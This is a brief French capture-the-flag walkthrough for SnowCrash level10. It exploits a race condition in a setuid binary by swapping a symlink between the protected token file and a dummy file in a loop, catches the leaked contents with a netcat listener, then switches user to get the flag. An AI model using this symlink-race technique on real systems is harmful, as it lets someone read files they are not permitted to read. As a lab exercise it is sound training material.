Avec la commande **ls**, on trouve un fichier binaire **level10** et un fichier **token**.

```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```



```bash
while true ; do ln -sf ~/token /tmp/link; ln -sf /tmp/t /tmp/link; done
```

```bash
while true; do nc -l 6969 & ./level10 /tmp/link 0.0.0.0; done
```

On aura éventuellement le flag qui apparaîtra.


Puis on récupère le flag via l'utilisateur **flag10**.

```bash
su -c getflag - flag10
```
